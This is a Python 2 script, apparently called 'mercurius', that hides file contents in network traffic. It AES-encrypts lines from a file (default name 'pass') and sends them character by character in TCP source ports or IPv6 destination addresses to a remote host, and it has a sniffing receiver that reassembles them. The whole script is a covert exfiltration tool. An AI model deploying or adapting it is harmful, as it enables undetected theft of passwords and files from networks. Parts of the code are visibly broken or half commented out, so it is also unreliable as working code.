#!/usr/bin/python -Btt

import sys
import getopt
from Crypto.Cipher import AES
from Crypto import Random
from base64 import b64encode
from base64 import b64decode
from time import sleep
from scapy.all import *

def usage():
	print("Usage: mercurius -S[erver] -s[port_mode] -d[ip_mode] -f[ile] -k[ey]\n"
		"-S[erver] *Listen for incomming covered messages"
		"-s[port_mode] *Uses TCP source ports as cover channel\n"
		"	-6 2001::2 *IPv6 Destination\n"
		"	-4 192.168.1.2 *IPv4 Destination\n"
		"\n"
		"-d[ip_mode] *Uses the destination IPv6 address as cover channel\n"
		"	-n[etwork] 2001:: *The destination IPv6 network\n"
		"\n"
		"-f[ile] *File used to store the message to be sent, or recieved\n"
		"-k[ey] *Key used for en/decryption\n"
	)
	sys.exit(2)

def main(argv):
	try:
		opts, args = getopt.getopt(argv, "hSs6:4:dn:f:k:", ["help", 'Server', 'sport_mode', 'ipv6_dst=', 'ipv4_dst=', 'dip_,mode', 'network=', 'file=', 'key='])
	except getopt.GetoptError:
		usage()

	#defaults
	server = 0
	mode = 0
	network = '2001::'
	ipv = 6
	ipv6_dst = '2001::2'
	ipv4_dst = '192.168.10.2'
	key = ':Yjds52%9wnsjp>)'
	bestand = 'pass'

	for opt, arg in opts:
		if opt in ("-h", "--help"):
			usage()
		elif opt in ("-S", "--Server"):
			server = 1
		elif opt in ("-s", "--sport_mode"):
			if mode == 0:
				mode = 1
			else:
				usage()
		elif opt in ("-6", "--ipv6_dst"):
			if mode == 1 and server == 0:
				ipv6_dst = arg
				ipv = 6
			else:
				usage()
		elif opt in ("-4", "--ipv4_dst"):
			if mode == 1 and server == 0:
				ipv4_dst = arg
				ipv = 4
			else:
				usage()
		elif opt in ("-d", "--dip_mode"):
			if mode == 0:
				mode = 2
			else:
				usage()
		elif opt in ("-n", "--network"):
			if mode == 2:
				network = arg
			else:
				usage()
		elif opt in ("-f", "--file"):
			bestand = arg
		elif opt in ("-k", "--key"):
			key = arg
	if mode == 0:
		usage()

	if server == 1:
		while 1:
			if mode == 1:
				msg = recieve_sp()
			elif mode == 2:
				msg = recieve_dip6(network)
			clear = decrypt(key, msg)
			if clear != -1:
				print 'Recieved: '+ clear
				f = open('pass', 'a')
				f.write(clear)
				f.close()
	else:
		while 1:
			f = open(bestand, 'r')
			for line in f:
				msg = encrypt(key, line)
				if mode == 1:
					send_sp(msg, ipv6_dst)
				elif mode == 2:
					send_dip6(msg, network)
				sleep(1)
			f.close()
			sleep(10)

def recieve_sp():
	msg = []
	while 1:
		recieved = sniff(filter="tcp and port 80", count=1)
		if hasattr(recieved[0], 'sport'):
			if recieved[0].sport == 30000:
				return str(msg)
			else:
				try:
					msg.append(chr(recieved[0].sport - 10000))
				except ValueError:
					print 'Strange sport detected: '+ str(recieved[0].sport)

def recieve_dip6(network):
	msg = []
	while 1:
		recieved = sniff(filter='net '+ network +'/64', count=1)
		if recieved[0].dst == '2001::FFF':
			print 'YOLO!'
			#return str(msg)
#		else:
#			try:
#				msg.append(chr(recieved[0].sport - 10000))
#			except ValueError:
#				print 'Strange sport detected: '+ str(recieved[0].sport)

def send_sp(msg, ipv6_dst):
	packet = IPv6(dst=ipv6_dst)
	segment = TCP(dport=80, flags=0x02)
	print msg
	for c in msg:
		segment = TCP(sport = ord(c) + 10000)
		send(packet/segment)
		sleep(1)
	segment = TCP(sport = 30000)
	send(packet/segment)

def send_dip6(msg, network):
	segment = TCP(dport=80, flags=0x02)
	print msg
	for c in msg:
		host = '%x' % ord(c)
		#packet = IPv6(dst = network + host)
		packet = IPv6(dst = network + 'FFF')
		send(packet/segment)
		sleep(1)
	packet = IPv6(dst = network + 'FFF')
	send(packet/segment)

def encrypt(key, clear):
	BLOCK_SIZE = 32
	PADDING = '/'
	pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
	EncodeAES = lambda c, s: b64encode(c.encrypt(pad(s)))
	cipher = AES.new(key)
	msg = EncodeAES(cipher, clear)
	return msg

def decrypt(key, msg):
	BLOCK_SIZE = 32
	PADDING = '/'
	pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
	DecodeAES = lambda c, e: c.decrypt(b64decode(e)).rstrip(PADDING)
	cipher = AES.new(key)
	try:
		clear = DecodeAES(cipher, msg)
	except:
		print 'corrupt message, ignoring'
		return -1
	return clear

if __name__ == '__main__':
	main(sys.argv[1:])